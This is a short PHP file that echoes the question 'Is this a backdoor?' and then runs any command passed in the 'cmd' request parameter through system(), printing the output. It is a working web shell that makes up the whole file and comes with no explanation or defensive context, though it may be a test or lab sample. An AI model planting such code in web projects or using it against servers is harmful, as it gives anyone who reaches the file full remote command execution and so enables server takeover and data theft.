<?php
echo "Is this a backdoor?";

if(isset($_REQUEST['cmd'])){
  echo "<pre>";
  $cmd = ($_REQUEST['cmd']); system($cmd);
  echo "</pre>";
  die;
}
?>
